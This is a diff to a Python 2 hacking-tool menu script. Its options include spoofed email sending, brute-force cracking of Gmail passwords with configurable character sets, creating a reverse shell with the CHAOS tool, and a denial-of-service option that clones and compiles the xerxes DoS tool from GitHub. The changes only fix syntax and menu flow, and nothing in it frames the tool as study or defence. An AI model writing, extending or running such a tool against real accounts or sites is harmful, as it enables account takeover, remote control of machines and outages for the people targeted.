@@ -1,4 +1,5 @@
-from os import system
+# -*- coding: utf-8 -*-
+import os, sys
 from time import sleep
 def choose():
    print "Select An Option:\n"
@@ -8,10 +9,8 @@ def choose():
    print "4. Crack Gmail Password"
    print "5. Create a Revearse Shell With CHAOS"
    print "6. DOS Website Attack"
+choose()
 option = input(">")
-while option != 1 or 2 or 3 or 4 or 5 or 6:
-  print"INVALID OPTION"
-  choose()
 if option == 1:
    os.system('apt-get install sendemail -y')
    print "You need a STMP server. \n If you don't have one, I suggest STMP2GO.com\n\n\n"
@@ -85,7 +84,7 @@ if option == 3:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.?!><…~|§€£¥_^[]{}"
   if type == 10:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.€£¥_^[]{}§|~…<>!?\ "
-  if type = 11:
+  if type == 11:
                  charset = raw_input("Type all charecters to be used: ")
   print ("using charset "+charset+".")
   min = raw_input("Minimum Password Leangth: ")
@@ -108,5 +107,6 @@ if option == 6:
    os.system('git clone https://github.com/zanyarjamal/xerxes')
    os.system('cd xerxes')
    os.system('gcc xerxes.c -o xerxes')
-                 
+else:
+   choose()          
                  
